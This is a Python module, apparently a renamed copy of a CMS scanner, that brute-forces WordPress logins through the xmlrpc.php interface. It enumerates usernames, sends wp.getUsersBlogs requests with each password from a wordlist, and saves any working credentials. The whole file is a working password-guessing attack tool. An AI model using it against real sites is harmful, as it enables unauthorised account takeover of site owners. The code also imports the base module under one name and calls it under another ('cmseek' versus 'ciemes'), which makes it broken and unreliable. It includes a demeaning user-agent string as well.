#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This is a part of CieMeS, check the LICENSE file for more information
# Rex4 - Cantix Crew
### WordPress XML-RPC Bruteforce module

import ciemesdb.basic as cmseek
import ciemesdb.sc as source # Contains function to detect cms from source code
import ciemesdb.header as header # Contains function to detect CMS from gathered http headers
import deepscans.wp.userenum as wp_user_enum
import multiprocessing ## Let's speed things up a lil bit (actually a hell lot faster) shell we?
from functools import partial ## needed somewhere :/
import sys
import ciemesdb.generator as generator
import requests

def wpbrutexmlrpc(xmlrpcurl, user, password):
    postdata = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>'.format(user, password)
    brute = requests.post(xmlrpcurl, data=postdata)
    try:
        if "isAdmin" in brute.text and "blogid" in brute.text:
            return True
        else:
            return False
    except:
        return False


def start():
    ciemes.clearscreen()
    ciemes.banner("WordPress XML-RPC Bruteforce Module")
    url = ciemes.targetinp("") # input('Enter Url: ')
    ciemes.info("Checking for WordPress")
    bsrc = ciemes.getsource(url, ciemes.randomua('thiscanbeanythingasfarasnowletitbewhatilovethemost'))
    if bsrc[0] != '1':
        # print(bsrc[1])
        ciemes.error("Could not get target source, CMSeek is quitting")
        ciemes.handle_quit()
    else:
        ## Parse generator meta tag
        parse_generator = generator.parse(bsrc[1])
        ga = parse_generator[0]
        ga_content = parse_generator[1]

        try1 = generator.scan(ga_content)
        if try1[0] == '1' and try1[1] == 'wp':
            wpcnf = '1'
        else:
            try2 = source.check(bsrc[1], url)
            if try2[0] == '1' and try2[1] == 'wp':
                wpcnf = '1'
            else:
                wpcnf = '0'
    if wpcnf != '1':
        print(bsrc[1])
        ciemes.error('Could not confirm WordPress... CMSeek is quitting')
        ciemes.handle_quit()
    else:
        ciemes.success("WordPress Confirmed... validating xmlrpc interface")
        xmlrpcurl = url + '/xmlrpc.php'
        wploginsrc = ciemes.getsource(xmlrpcurl, ciemes.randomua('thatsprettygay'))
        if wploginsrc[1] == 'HTTP Error 405: Method Not Allowed':
            ciemes.success("Login form found.. Detecting Username For Bruteforce")
            wpparamuser = []
            uenum = wp_user_enum.start('wp', url, ciemes.randomua('r'), '0', bsrc[1])
            usernamesgen = uenum[0]
            wpparamuser = uenum[1]

            if wpparamuser == []:
                customuser = input("[~] CMSeek could not enumerate usernames, enter username if you know any: ")
                if customuser == "":
                    ciemes.error("No user found, CMSeek is quitting")
                else:
                    wpparamuser.append(customuser)
            wpbruteusers = set(wpparamuser)

            for user in wpbruteusers:
                passfound = '0'
                print('\n')
                ciemes.info("Bruteforcing User: " + ciemes.bold + user + ciemes.cln)
                pwd_file = open("wordlist/passwords.txt", "r")
                passwords = pwd_file.read().split('\n')
                passwords.insert(0, user)
                for password in passwords:
                    if password != '' and password != '\n':
                        sys.stdout.write('[*] Testing Password: ')
                        sys.stdout.write('%s\r\r' % password)
                        sys.stdout.flush()
                        cursrc = wpbrutexmlrpc(xmlrpcurl, user, password)
                        if cursrc:
                            ciemes.success('Password found!')
                            print(" |\n |--[username]--> " + ciemes.bold + user + ciemes.cln + "\n |\n |--[password]--> " + ciemes.bold + password + ciemes.cln + "\n |")
                            ciemes.success('Enjoy The Hunt!')
                            ciemes.savebrute(url,url + '/wp-login.php',user,password)
                            passfound = '1'
                            break
                        else:
                            continue
                        break
                if passfound == '0':
                        ciemes.error('\n\nCould Not find Password!')
                print('\n\n')

        else:
            ciemes.error("Couldn't find XML-RPC interface... CieMeS is quitting")
            # print(wploginsrc[1])
            ciemes.handle_quit()
